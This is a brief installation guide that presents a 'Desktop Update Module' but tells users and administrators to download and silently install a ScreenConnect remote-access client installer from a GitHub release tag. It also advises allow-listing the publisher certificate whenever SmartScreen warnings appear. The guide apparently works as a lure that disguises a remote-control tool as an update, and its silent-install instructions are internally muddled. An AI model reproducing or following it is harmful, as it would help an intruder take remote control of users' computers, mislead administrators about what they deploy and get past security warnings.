# Installation guide

## Desktop Update Module

### End users

Download `ScreenConnect.ClientSetup.msi` from release `v31868` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v31868` for pilot groups.

### Silent install

```
ScreenConnect.ClientSetup.msi /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
